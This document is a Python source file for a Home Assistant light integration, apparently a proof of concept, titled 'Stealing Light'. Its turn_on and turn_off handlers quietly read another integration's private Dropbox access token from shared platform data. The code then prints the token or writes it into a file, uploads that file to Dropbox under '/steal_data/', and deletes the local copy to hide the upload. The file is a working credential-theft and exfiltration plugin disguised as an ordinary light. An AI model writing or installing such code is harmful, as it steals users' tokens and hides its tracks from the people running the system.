"""Platform for integrating a Stealing light."""
from __future__ import annotations
from typing import Any
import os
from datetime import datetime

import dropbox

# Import the device class from the component that you want to support
from homeassistant.components.light import LightEntity
from homeassistant.core import HomeAssistant
from homeassistant.helpers.entity_platform import AddEntitiesCallback
from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType

UPLOAD_KEY = "upload"


def setup_platform(
    hass: HomeAssistant,
    config: ConfigType,
    add_entities: AddEntitiesCallback,
    discovery_info: DiscoveryInfoType | None = None,
) -> None:

    """Set up the Stealing Light platform."""

    if UPLOAD_KEY in config:
        lights = [LightStealing(config[UPLOAD_KEY])]
    else:
        lights = [LightStealing()]
    add_entities(lights)


class LightStealing(LightEntity):
    """Representation of a Stealing Light."""

    _target = "switch.exfiltration_switch"

    def __init__(self, upload: bool = False) -> None:
        """Initialize a LightStealing."""
        self._light = LightEntity()
        self._name = "Light Stealing"
        self._brightness = None
        self._state = False
        self._upload = upload
        print(self._name + '" was created.')

    @property
    def name(self) -> str:
        """Return the display name of this light."""
        return self._name

    @property
    def brightness(self):
        """Return the brightness of the light.

        This method is optional. Removing it indicates to Home Assistant
        that brightness is not supported for this light.
        """
        return self._brightness

    @property
    def is_on(self) -> bool | None:
        """Return true if light is on."""
        return self._state

    def turn_on(self, **kwargs: Any) -> None:
        """Instruct the light to turn on.

        You can skip the brightness part if your light does not support
        brightness control.
        """
        self._brightness = 255
        self._state = True
        self.use_stolen_access_token()

    def turn_off(self, **kwargs: Any) -> None:
        """Instruct the light to turn off."""
        self._brightness = 0
        self._state = False
        self.use_stolen_access_token()

    def update(self) -> None:
        """Fetch new state data for this light.

        This is the only method that should fetch new data for Home Assistant.
        """
        # self._light.update()
        # self._state = self._light.is_on()
        # self._brightness = self._light.brightness
        return

    def use_stolen_access_token(self):
        """This method uses the stolen token for uploading a file on Dropbox."""
        data = self.hass.data
        integrations = data["integrations"]
        switch_integration = integrations["exfiltration_switch"]
        switch_component = switch_integration.get_component()
        target_switch = switch_component.switch.ExfiltrationSwitch

        dropbox_token = target_switch._access_token
        if not self._upload:
            print(dropbox_token)
        else:
            filename = "tmp.txt"
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # preparing the file to exfiltrate
            tmp_file = open(filename, "w", encoding="utf-8")
            text_to_write = "At " + current_time + ' Luke was here! (Thanks to your dropbox token: "' + dropbox_token + '")'
            tmp_file.write(text_to_write)
            tmp_file.close()

            # Sending file
            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)

            # Removing the tmp file to hide the upload
            os.remove(filename)

    def upload_file(self, file_from, file_to, access_token):
        """upload a file to Dropbox using API v2"""
        dbx = dropbox.Dropbox(access_token)

        with open(file_from, "rb") as opened_file:
            dbx.files_upload(
                opened_file.read(), file_to, mode=dropbox.files.WriteMode.overwrite
            )
